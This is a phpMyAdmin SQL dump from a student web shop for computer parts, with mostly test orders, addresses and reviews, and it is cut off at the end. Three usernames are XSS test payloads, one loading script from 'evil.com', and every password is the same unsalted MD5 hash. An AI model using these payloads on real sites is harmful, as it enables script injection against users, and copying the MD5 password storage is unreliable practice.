-- phpMyAdmin SQL Dump
-- version 5.2.2
-- https://www.phpmyadmin.net/
--
-- Host: localhost:3306
-- Generation Time: Jun 04, 2025 at 03:29 AM
-- Server version: 8.4.3
-- PHP Version: 8.3.16

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `form`
--

-- --------------------------------------------------------

--
-- Table structure for table `banner`
--

CREATE TABLE `banner` (
  `id` int NOT NULL,
  `hinh_anh` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `thu_tu` int DEFAULT '0',
  `trang_thai` tinyint(1) DEFAULT '1',
  `created_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `banner`
--

INSERT INTO `banner` (`id`, `hinh_anh`, `thu_tu`, `trang_thai`, `created_at`) VALUES
(1, 'https://tinhocanhphat.vn/media/lib/28-02-2023/may-tinh-do-hoa.jpg', 1, 1, '2025-06-03 03:36:11'),
(2, 'https://hanoicomputercdn.com/media/category/cb_75ff8d6ff1f6f3eb0aaa2a201b374ac0.png', 2, 1, '2025-06-03 03:45:04'),
(3, 'https://file.hstatic.net/200000053304/article/file_psd_banner_fb__6000018b277c40ec82da58cedf0ee4ea.png', 3, 1, '2025-06-03 03:46:03'),
(4, 'https://kimlongcenter.com/upload/news/huong-dan-build-cau-hinh-pc-choi-game-cho-sinh-vien-2024_4.jpg', 4, 1, '2025-06-03 03:46:03'),
(5, 'https://cdn2.cellphones.com.vn/insecure/rs:fill:0:350/q:90/plain/https://dashboard.cellphones.com.vn/storage/PC%20CPS_1920x193.png', 5, 1, '2025-06-03 04:01:38'),
(6, 'https://cdn2.cellphones.com.vn/insecure/rs:fill:0:350/q:90/plain/https://dashboard.cellphones.com.vn/storage/pc-10-trieu-desktop-15-11.png', 6, 1, '2025-06-03 04:03:47');

-- --------------------------------------------------------

--
-- Table structure for table `chu_chay`
--

CREATE TABLE `chu_chay` (
  `id` int NOT NULL,
  `noi_dung` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `toc_do` int DEFAULT '100',
  `trang_thai` tinyint(1) DEFAULT '1',
  `created_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `chu_chay`
--

INSERT INTO `chu_chay` (`id`, `noi_dung`, `toc_do`, `trang_thai`, `created_at`) VALUES
(1, '🔥 Flash Sale: Giảm đến 30% cho tất cả linh kiện PC! Nhanh tay đặt hàng ngay hôm nay! 🔥', 10, 1, '2025-06-03 04:08:52'),
(2, '🎉 New Deals: Up to 40% off on selected GPUs!', 15, 1, '2025-06-03 12:20:51'),
(3, '🛠️ Free PC assembly with purchases over 10M VND!', 20, 1, '2025-06-03 12:20:51'),
(4, 'test chữ chạy', 15, 1, '2025-06-04 03:29:13');

-- --------------------------------------------------------

--
-- Table structure for table `dang_ky`
--

CREATE TABLE `dang_ky` (
  `id` int NOT NULL,
  `user` varchar(50) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `phone` varchar(15) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `email` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `pass` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `role` varchar(20) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci DEFAULT 'user',
  `is_active` tinyint(1) DEFAULT '1'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `dang_ky`
--

INSERT INTO `dang_ky` (`id`, `user`, `phone`, `email`, `pass`, `role`, `is_active`) VALUES
(1, 'ubuntu', '0987654333', 'ubuntu@gmail.com', 'e10adc3949ba59abbe56e057f20f883e', 'user', 1),
(2, 'Admin', '1234567890', 'admin@gmail.com', 'e10adc3949ba59abbe56e057f20f883e', 'admin', 1),
(3, 'test', '0123456789', 'test@gmail.com', 'e10adc3949ba59abbe56e057f20f883e', 'user', 1),
(6, 'test12345', '1111111114', 'test12434@gmail.com', 'e10adc3949ba59abbe56e057f20f883e', 'user', 0),
(7, '12', '1111111115', 'q@gmail.com', 'e10adc3949ba59abbe56e057f20f883e', 'user', 0),
(8, 'testuser', '123456789', 'test@example.com', 'e10adc3949ba59abbe56e057f20f883e', 'user', 1),
(9, 'unkown', '1111111119', 'unkown123@gmail.com', 'e10adc3949ba59abbe56e057f20f883e', 'user', 1),
(10, '<script>alert(\"XSS\")</script>', '0123454321', 'tes1t@example.com', 'e10adc3949ba59abbe56e057f20f883e', 'user', 1),
(11, '<img src=x onerror=alert(\"XSS\")>', '0987654328', 'test9@example.com', 'e10adc3949ba59abbe56e057f20f883e', 'user', 1),
(12, '<script src=\"http://evil.com/x.js\"></script>', '1112111111', 'qq@gmail.com', 'e10adc3949ba59abbe56e057f20f883e', 'user', 1),
(13, 'unkown', '1111111116', 'unkown112@gmail.com', 'e10adc3949ba59abbe56e057f20f883e', 'user', 1),
(14, 'unkown117', '1111111117', 'unkown117@gmail.com', 'e10adc3949ba59abbe56e057f20f883e', 'user', 1);

-- --------------------------------------------------------

--
-- Table structure for table `danh_gia`
--

CREATE TABLE `danh_gia` (
  `id` int NOT NULL,
  `id_product` varchar(50) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `ten_nguoi_dung` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `so_sao` int NOT NULL,
  `binh_luan` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `ngay` datetime NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `danh_gia`
--

INSERT INTO `danh_gia` (`id`, `id_product`, `ten_nguoi_dung`, `so_sao`, `binh_luan`, `ngay`) VALUES
(1, 'cpu002', 'admin', 5, 'd', '2025-04-26 00:00:00'),
(2, 'cpu002', 'admin', 5, 'g', '2025-04-26 00:00:00'),
(3, 'cpu002', 'admin', 5, 'hello', '2025-04-26 00:00:00'),
(4, 'cpu003', 'admin', 5, 'hello there\\n', '2025-04-28 00:00:00'),
(5, 'cpu003', 'admin', 5, 'ok guy', '2025-05-06 00:00:00'),
(6, 'cpu007', 'admin', 5, 'ok', '2025-05-06 00:00:00'),
(7, 'cpu001', 'admin', 5, 'ok', '2025-05-06 00:00:00'),
(8, 'gpu001', 'Admin', 5, 'woo\\n', '2025-05-16 00:00:00'),
(9, 'peripheral009', 'Admin', 5, 'yo', '2025-05-16 00:00:00'),
(10, 'gpu001', 'Admin', 1, 'hàng lỗi', '2025-05-23 00:00:00'),
(11, 'case009', 'Admin', 5, 'hello there', '2025-05-25 22:56:54'),
(12, 'case009', 'Admin', 3, 'ok', '2025-05-25 22:57:10');

-- --------------------------------------------------------

--
-- Table structure for table `dia_chi_giao_hang`
--

CREATE TABLE `dia_chi_giao_hang` (
  `ma_dia_chi` int NOT NULL,
  `ma_tk` int NOT NULL,
  `nguoi_nhan` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `sdt_nhan` varchar(20) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `dia_chi` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `tinh_thanh` varchar(50) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `quan_huyen` varchar(50) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `phuong_xa` varchar(50) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `mac_dinh` tinyint(1) DEFAULT '0'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `dia_chi_giao_hang`
--

INSERT INTO `dia_chi_giao_hang` (`ma_dia_chi`, `ma_tk`, `nguoi_nhan`, `sdt_nhan`, `dia_chi`, `tinh_thanh`, `quan_huyen`, `phuong_xa`, `mac_dinh`) VALUES
(1, 1, 'Nguyễn Văn A', '0987654333', '123 Đường Láng', 'Hà Nội', 'Đống Đa', 'Láng Thượng', 1),
(6, 1, 'vip6', '0987654334', 'hn', 'Hà Nội', 'Quận 1', 'Phường 3', 0),
(7, 1, 'Nguyễn Trường Sinh', '0987654334', 'hn', 'TP HCM', 'Quận 2', 'Phường 4', 0),
(8, 1, 'zzzzxz', '0987654321', 'hn', 'TP HCM', 'Quận 3', 'Phường 3', 0),
(9, 3, 'vip', '0987654321', 'hn', 'TP HCM', 'Quận 5', 'Phường 1', 0),
(10, 3, 'vip', '0987654321', 'hn', 'TP HCM', 'Quận 4', 'Phường 2', 0),
(11, 2, 'admin', '0987654321', 'hn', 'TP HCM', 'Quận 3', 'Phường 2', 0),
(12, 2, 'admin', '0987654321', 'hn', 'TP HCM', 'Quận 3', 'Phường 2', 0),
(15, 2, 'admin', '0987654334', 'Lấy tại cửa hàng', '', '', '', 0),
(16, 2, 'baó', '0987654321', 'Lấy tại cửa hàng', '', '', '', 0),
(17, 2, 'admin', '0987654321', 'hn', 'TP HCM', 'Quận 2', 'Phường 3', 0),
(18, 2, 'admin', '0987654321', 'TP HCM', 'TP HCM', 'Quận 2', 'Phường 2', 0),
(19, 2, 'admin', '0987654321', 'TP HCM', 'TP HCM', 'Quận 2', 'Phường 2', 0),
(20, 2, 'admin', '00987878987', 'Lấy tại cửa hàng', '', '', '', 0),
(21, 2, 'admin', '00987878987', 'Lấy tại cửa hàng', '', '', '', 0),
(22, 2, 'admin', '00987878987', 'Lấy tại cửa hàng', '', '', '', 0),
(23, 2, 'admin', '00987878987', 'Lấy tại cửa hàng', '', '', '', 0),
(24, 2, 'admin', '00987878987', 'Lấy tại cửa hàng', '', '', '', 0),
(25, 2, 'admin', '00987878987', 'Lấy tại cửa hàng', '', '', '', 0),
(26, 2, 'admin32', '7878987909', 'Lấy tại cửa hàng', '', '', '', 0),
(27, 2, 'admin32', '7878987909', 'HCM', 'TP HCM', 'Quận 1', 'Phường 1', 0),
(44, 2, 'admin', '7878987909', 'Lấy tại cửa hàng', '', '', '', 0),
(45, 2, 'admin', '7878987909', 'Lấy tại cửa hàng', '', '', '', 0),
(46, 2, 'admin', '7878987909', 'HCM', 'TP HCM', 'Quận 2', 'Phường 1', 0),
(47, 3, 'test', '7878987909', 'Lấy tại cửa hàng', '', '', '', 0),
(48, 1, 'hacker', '7878987909', 'Lấy tại cửa hàng', '', '', '', 0),
(49, 1, 'hacker', '7878987909', 'Lấy tại cửa hàng', '', '', '', 0),
(50, 2, 'Admin', '7878987909', 'HCM', 'TP HCM', 'Quận 1', 'Phường 2', 0),
(51, 2, 'Admin', '7878987909', 'HCM', 'TP HCM', 'Quận 2', 'Phường 5', 0),
(52, 2, 'Admin', '7878987909', 'HCM', 'TP HCM', 'Quận 4', 'Phường 2', 0),
(53, 2, 'Admin', '7878987909', 'HCM', 'TP HCM', 'Quận 2', 'Phường 5', 0),
(54, 2, 'Admin', '7878987909', 'Lấy tại cửa hàng', '', '', '', 0),
(55, 2, 'Admin', '7878987909', 'HCM', 'TP HCM', 'Quận 2', 'Phường 2', 0),
(56, 2, 'Admin', '7878987909', 'Lấy tại cửa hàng', '', '', '', 0),
(57, 2, 'Admin', '7878987909', 'nhà số 1', 'Thành phố Hà Nội', 'Quận Long Biên', 'Phường Phúc Đồng', 0),
(58, 2, 'Admin', '7878987909', 'HCM', 'Tỉnh Điện Biên', 'Huyện Mường Nhé', 'Xã Quảng Lâm', 0),
(59, 2, 'Admin', '7878987909', 'Lấy tại cửa hàng', '', '', '', 0),
(60, 2, 'Admin', '7878987909', 'HCM', 'Tỉnh Phú Thọ', 'Huyện Thanh Thuỷ', 'Xã Đào Xá', 0),
(61, 2, 'Admin', '7878987909', 'HCM', 'Thành phố Hà Nội', 'Huyện Đông Anh', 'Xã Bắc Hồng', 0),
(62, 2, 'Admin', '7878987909', 'HCM', 'Thành phố Hà Nội', 'Quận Ba Đình', 'Phường Kim Mã', 0),
(63, 2, 'Admin', '7878987909', 'HCM', 'Tỉnh Bắc Giang', 'Huyện Hiệp Hòa', 'Xã Hương Lâm', 0),
(64, 2, 'Admin', '7878987909', '1', 'Thành phố Hà Nội', 'Quận Hoàng Mai', 'Phường Lĩnh Nam', 0);

-- --------------------------------------------------------

--
-- Table structure for table `don_hang`
--

CREATE TABLE `don_hang` (
  `id` int NOT NULL,
  `ma_nguoi_dung` int NOT NULL,
  `ma_dia_chi` int DEFAULT NULL,
  `tong_tien` int NOT NULL,
  `trang_thai` varchar(50) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci DEFAULT 'Chờ xử lý',
  `ngay_dat` datetime DEFAULT CURRENT_TIMESTAMP,
  `ghi_chu` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `don_hang`
--

INSERT INTO `don_hang` (`id`, `ma_nguoi_dung`, `ma_dia_chi`, `tong_tien`, `trang_thai`, `ngay_dat`, `ghi_chu`) VALUES
(18, 2, NULL, 17780000, 'Đã thanh toán', '2025-04-29 06:52:29', ''),
(19, 2, NULL, 4030000, 'Đã thanh toán', '2025-04-29 06:54:06', ''),
(21, 2, NULL, 3430000, 'Đã thanh toán', '2025-04-29 07:23:46', ''),
(22, 2, 15, 60030000, 'Đã thanh toán', '2025-04-29 07:40:19', 'test'),
(24, 2, 17, 6500000, 'Chờ xử lý', '2025-04-29 08:46:42', 'test2'),
(25, 2, 18, 26000000, 'Chờ xử lý', '2025-04-29 09:54:08', 'ok'),
(26, 2, 19, 80000000, 'Đã thanh toán', '2025-04-17 09:55:05', ''),
(27, 2, 20, 16530000, 'Chờ xử lý', '2025-05-06 11:57:33', ''),
(28, 2, 21, 4530000, 'Đã thanh toán', '2025-05-04 12:01:26', ''),
(29, 2, 22, 66930000, 'Đã thanh toán', '2025-05-06 12:43:00', ''),
(30, 2, 23, 165030000, 'Đã thanh toán', '2025-05-05 14:01:57', ''),
(31, 2, 24, 7030000, 'Chưa thanh toán', '2025-05-06 15:10:47', ''),
(32, 2, 25, 42030000, 'Chờ xử lý', '2025-05-06 15:52:17', ''),
(33, 2, 26, 42030000, 'Đã thanh toán', '2025-05-08 08:02:56', ''),
(34, 2, 27, 42000000, 'Đã thanh toán', '2025-05-08 08:10:18', ''),
(51, 2, 44, 66930000, 'Đã thanh toán', '2025-05-10 13:03:53', 'hello'),
(52, 2, 45, 37030000, 'Chờ xử lý', '2025-05-15 06:25:49', ''),
(53, 2, 46, 17290000, 'Chờ xử lý', '2025-05-16 06:47:23', ''),
(54, 3, 47, 14030000, 'Đã thanh toán', '2025-05-16 09:06:23', ''),
(55, 1, 48, 16530000, 'Chờ xử lý', '2025-05-22 09:40:41', ''),
(56, 1, 49, 28030000, 'Chờ xử lý', '2025-05-22 09:42:30', ''),
(57, 2, 50, 14000000, 'Chờ xử lý', '2025-05-23 02:08:53', 'nope'),
(58, 2, 51, 14990000, 'Đã thanh toán', '2025-05-23 02:10:18', 'npe'),
(59, 2, 52, 6500000, 'Chưa thanh toán', '2025-05-23 02:18:49', 'nopeeee'),
(60, 2, 53, 20380000, 'Chờ xử lý', '2025-05-29 17:20:34', ''),
(61, 2, 54, 4920000, 'Chờ xử lý', '2025-05-29 17:22:02', ''),
(62, 2, 55, 4890000, 'Đã thanh toán', '2025-05-29 17:22:41', ''),
(64, 2, 57, 40000000, 'Đã thanh toán', '2025-05-30 04:23:00', ''),
(65, 2, 58, 10690000, 'Chờ xử lý', '2025-05-30 04:24:15', ''),
(66, 2, 59, 18530000, 'Đã thanh toán', '2025-05-30 05:52:45', ''),
(67, 2, 60, 10690000, 'Chờ xử lý', '2025-05-30 06:01:42', ''),
(68, 2, 61, 17290000, 'Chờ xử lý', '2025-05-30 06:06:39', ''),
(69, 2, 62, 21900000, 'Đã thanh toán', '2025-05-30 07:25:43', ''),
(70, 2, 63, 40940000, 'Đã thanh toán', '2025-06-02 16:05:17', ''),
(71, 2, 64, 14000000, 'Chờ xử lý', '2025-06-03 08:00:12', '');

-- --------------------------------------------------------

--
-- Table structure for table `footer`
--

CREATE TABLE `footer` (
  `id` int NOT NULL,
  `noi_dung` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `tac_gia` varchar(100) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `ban_quyen` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `dia_diem` varchar(100) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `ten_lop` varchar(50) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `ten_truong` varchar(100) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `trang_thai` tinyint(1) DEFAULT '1',
  `created_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `footer`
--

INSERT INTO `footer` (`id`, `noi_dung`, `tac_gia`, `ban_quyen`, `dia_diem`, `ten_lop`, `ten_truong`, `trang_thai`, `created_at`) VALUES
(1, 'Nhóm 11: Đề tài xây dựng web bán linh kiện máy tính', 'Nhóm 11', '© 2025 Nhóm 11', 'Thủ đô Hà Nội, Việt Nam', 'DHMT16A2HN', 'Đại học Kinh tế Kỹ thuật Công nghiệp - UNETI', 1, '2025-06-02 15:47:40');

-- --------------------------------------------------------

--
-- Table structure for table `gio_hang`
--

CREATE TABLE `gio_hang` (
  `id` int NOT NULL,
  `ma_nguoi_dung` int NOT NULL,
  `id_product` varchar(50) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `so_luong` int NOT NULL DEFAULT '1',
  `ngay_them` datetime DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `hoa_don`
--

CREATE TABLE `hoa_don` (
  `id` int NOT NULL,
  `ma_don_hang` int NOT NULL,
  `ten_nguoi` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `ten_san_pham` text COLLATE utf8mb4_unicode_ci,
  `tong_tien` int NOT NULL,
  `dia_chi` text COLLATE utf8mb4_unicode_ci,
  `phuong_thuc_thanh_toan` varchar(50) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `ngay_tao` datetime DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `hoa_don`
--

INSERT INTO `hoa_don` (`id`, `ma_don_hang`, `ten_nguoi`, `ten_san_pham`, `tong_tien`, `dia_chi`, `phuong_thuc_thanh_toan`, `ngay_tao`) VALUES
(1, 57, 'Admin', 'Intel Core i9-13900K (x1)', 14000000, 'HCM, Phường 2, Quận 1, TP HCM', 'cod', '2025-05-23 09:08:53'),
(2, 58, 'Admin', 'Intel Core i9-14900K (x1)', 14990000, 'HCM, Phường 5, Quận 2, TP HCM', 'vnpay', '2025-05-23 09:10:18'),
(3, 59, 'Admin', 'MSI MPG B650 Tomahawk WiFi (x1)', 6500000, 'HCM, Phường 2, Quận 4, TP HCM', 'cod', '2025-05-23 09:18:49'),
(4, 60, 'Admin', 'AMD Ryzen 7 5700X (x1), AMD Ryzen 7 9800X3D (x1)', 20380000, 'HCM, Phường 5, Quận 2, TP HCM', 'cod', '2025-05-30 00:20:34'),
(5, 61, 'Admin', 'Gigabyte B760M Gaming Plus Wifi D4 (x1)', 4920000, 'Lấy tại cửa hàng', 'vnpay', '2025-05-30 00:22:02'),
(6, 62, 'Admin', 'Gigabyte B760M Gaming Plus Wifi D4 (x1)', 4890000, 'HCM, Phường 2, Quận 2, TP HCM', 'vnpay', '2025-05-30 00:22:41'),
(8, 64, 'Admin', 'NVIDIA GeForce RTX 4090 (x1)', 40000000, 'nhà số 1, Phường Phúc Đồng, Quận Long Biên, Thành phố Hà Nội', 'vnpay', '2025-05-30 11:23:00'),
(9, 65, 'Admin', 'CPU Intel Core i7 14700K (x1)', 10690000, 'HCM, Xã Quảng Lâm, Huyện Mường Nhé, Tỉnh Điện Biên', 'cod', '2025-05-30 11:24:15'),
(10, 66, 'Admin', 'AMD Ryzen 9 9950X (x1)', 18530000, 'Lấy tại cửa hàng', 'vnpay', '2025-05-30 12:52:45'),
(11, 67, 'Admin', 'CPU Intel Core i7 14700K (x1)', 10690000, 'HCM, Xã Đào Xá, Huyện Thanh Thuỷ, Tỉnh Phú Thọ', 'cod', '2025-05-30 13:01:42'),
(12, 68, 'Admin', 'CPU Intel Core Ultra 9 285K (x1)', 17290000, 'HCM, Xã Bắc Hồng, Huyện Đông Anh, Thành phố Hà Nội', 'cod', '2025-05-30 13:06:39'),
(13, 69, 'Admin', 'Gigabyte RTX 4070 GAMING OC 12GB GDDR6X (x1)', 21900000, 'HCM, Phường Kim Mã, Quận Ba Đình, Thành phố Hà Nội', 'vnpay', '2025-05-30 14:25:44'),
(14, 70, 'Admin', 'Intel Core i9-14900K (x1), MSI PRO Z790-S WIFI DDR5 (x5)', 40940000, 'HCM, Xã Hương Lâm, Huyện Hiệp Hòa, Tỉnh Bắc Giang', 'cod', '2025-06-02 23:05:17'),
(15, 71, 'Admin', 'Intel Core i9-13900K (x1)', 14000000, '1, Phường Lĩnh Nam, Quận Hoàng Mai, Thành phố Hà Nội', 'cod', '2025-06-03 15:00:12');

-- --------------------------------------------------------

--
-- Table structure for table `lien_he`
--

CREATE TABLE `lien_he` (
  `id` int NOT NULL,
  `ten` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `email` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `sdt` varchar(20) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `noi_dung` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `thoi_gian_gui` timestamp NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `lien_he`
--

INSERT INTO `lien_he` (`id`, `ten`, `email`, `sdt`, `noi_dung`, `thoi_gian_gui`) VALUES
(1, 'sinh', 'unkown@gmail.com', '7878987909', 'hello', '2025-05-22 15:16:36'),
(2, 'sinh', 'unkown@gmail.com', '7878987909', 'hello', '2025-05-22 15:18:05');

-- --------------------------------------------------------

--
-- Table structure for table `phan_hoi_review`
--

CREATE TABLE `phan_hoi_review` (
  `id` int NOT NULL,
  `id_danh_gia` int NOT NULL,
  `noi_dung_phan_hoi` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `ngay` date NOT NULL,
  `ten_nguoi_tra_loi` varchar(50) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `phan_hoi_review`
--

INSERT INTO `phan_hoi_review` (`id`, `id_danh_gia`, `noi_dung_phan_hoi`, `ngay`, `ten_nguoi_tra_loi`) VALUES
(8, 1, '?', '2025-04-26', 'admin'),
(10, 3, 'hi there', '2025-04-26', 'admin'),
(11, 2, 'dô', '2025-04-27', 'test12345'),
(12, 4, 'hi there', '2025-04-28', 'admin'),
(13, 4, 'ok hi', '2025-04-28', 'admin'),
(14, 5, 'seo', '2025-05-06', 'admin'),
(15, 7, 'ok too\\n', '2025-05-16', 'Admin'),
(16, 8, 'wooo', '2025-05-16', 'Admin'),
(17, 9, 'what', '2025-05-16', 'Admin'),
(18, 9, 'amzing good job', '2025-05-23', 'unkown'),
(19, 4, 'ok thanks', '2025-05-29', 'Admin'),
(20, 10, 'seo', '2025-05-30', 'Admin');

-- --------------------------------------------------------

--
-- Table structure for table `thanh_toan`
--

CREATE TABLE `thanh_toan` (
  `id` int NOT NULL,
  `ma_don_hang` int NOT NULL,
  `phuong_thuc_thanh_toan` varchar(50) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `tong_so_tien` int DEFAULT NULL,
  `trang_thai_thanh_toan` varchar(50) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci DEFAULT 'Chưa thanh toán',
  `thoi_gian_thanh_toan` datetime DEFAULT NULL,
  `thoi_gian_cap_nhat` datetime DEFAULT NULL,
  `ma_giao_dich` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `thanh_toan`
--

INSERT INTO `thanh_toan` (`id`, `ma_don_hang`, `phuong_thuc_thanh_toan`, `tong_so_tien`, `trang_thai_thanh_toan`, `thoi_gian_thanh_toan`, `thoi_gian_cap_nhat`, `ma_giao_dich`) VALUES
(19, 19, 'cod', 4030000, 'Chưa thanh toán', NULL, NULL, NULL),
(21, 21, 'vnpay', 3430000, 'Đã thanh toán', '2025-04-15 14:25:10', '2025-04-15 14:25:10', '14932189'),
(22, 22, 'vnpay', 60030000, 'Đã thanh toán', '2025-04-29 14:40:47', '2025-04-29 14:40:47', '14932220'),
(24, 24, 'cod', 6500000, 'Chưa thanh toán', NULL, NULL, NULL),
(25, 25, 'cod', 26000000, 'Chưa thanh toán', NULL, NULL, NULL),
(26, 26, 'vnpay', 80000000, 'Đã thanh toán', '2025-04-30 16:55:44', '2025-04-30 16:55:44', '14932519'),
(27, 27, 'vnpay', 16530000, 'Chưa thanh toán', NULL, NULL, NULL),
(28, 28, 'cod', 4530000, 'Chưa thanh toán', NULL, NULL, NULL),
(29, 29, 'cod', 66930000, 'Chưa thanh toán', NULL, NULL, NULL),
(30, 30, 'vnpay', 165030000, 'Đã thanh toán', '2025-05-06 21:03:15', '2025-05-06 21:03:15', '14942214'),
(31, 31, 'cod', 7030000, 'Chưa thanh toán', NULL, NULL, NULL),
(32, 32, 'cod', 42030000, 'Chưa thanh toán', NULL, NULL, NULL),
(33, 33, 'cod', 42030000, 'Chưa thanh toán', NULL, NULL, NULL),
(34, 34, 'cod', 42000000, 'Chưa thanh toán', NULL, NULL, NULL),
(51, 51, 'vnpay', 66930000, 'Đã thanh toán', '2025-05-10 20:04:39', '2025-05-10 20:04:39', '14949411'),
(52, 52, 'cod', 37030000, 'Chưa thanh toán', NULL, NULL, NULL),
(53, 53, 'vnpay', 17290000, 'Chưa thanh toán', NULL, NULL, NULL),
(54, 54, 'cod', 14030000, 'Chưa thanh toán', NULL, NULL, NULL),
(55, 55, 'cod', 16530000, 'Chưa thanh toán', NULL, NULL, NULL),
(56, 56, 'cod', 28030000, 'Chưa thanh toán', NULL, NULL, NULL),
(57, 57, 'cod', 14000000, 'Chưa thanh toán', NULL, NULL, NULL),
(58, 58, 'vnpay', 14990000, 'Đã thanh toán', '2025-05-23 09:10:44', '2025-05-23 09:10:44', '14974486'),
(59, 59, 'cod', 6500000, 'Chưa thanh toán', NULL, NULL, NULL),
(60, 60, 'cod', 20380000, 'Chưa thanh toán', NULL, NULL, NULL),
(61, 61, 'vnpay', 4920000, 'Chưa thanh toán', NULL, NULL, NULL),
(62, 62, 'vnpay', 4890000, 'Đã thanh toán', '2025-05-30 00:24:07', '2025-05-30 00:24:07', '14988853'),
(64, 64, 'vnpay', 40000000, 'Chưa thanh toán', NULL, NULL, NULL),
(66, 66, 'vnpay', 18530000, 'Đã thanh toán', '2025-05-30 12:53:31', '2025-05-30 12:53:31', '14989557'),
(67, 67, 'cod', 10690000, 'Chưa thanh toán', NULL, NULL, NULL),
(68, 68, 'cod', 17290000, 'Chưa thanh toán', NULL, NULL, NULL),
(69, 69, 'vnpay', 21900000, 'Đã thanh toán', '2025-05-30 14:26:07', '2025-05-30 14:26:07', '14989745'),
(70, 70, 'cod', 40940000, 'Chưa thanh toán', NULL, NULL, NULL),
(71, 71, 'cod', 14000000, 'Chưa thanh toán', NULL, NULL, NULL);

-- --------------------------------------------------------

--
-- Table structure for table `top_menu`
--

CREATE TABLE `top_menu` (
  `id` int NOT NULL,
  `ten` varchar(50) COLLATE utf8mb4_unicode_ci NOT NULL,
  `url` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `thu_tu` int DEFAULT '0',
  `trang_thai` tinyint(1) DEFAULT '1',
  `created_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `top_menu`
--

INSERT INTO `top_menu` (`id`, `ten`, `url`, `thu_tu`, `trang_thai`, `created_at`) VALUES
(1, 'Liên hệ', '/contact', 1, 1, '2025-06-02 15:18:12'),
(2, 'Nhà phát triển', '/developer', 2, 1, '2025-06-02 15:18:12'),
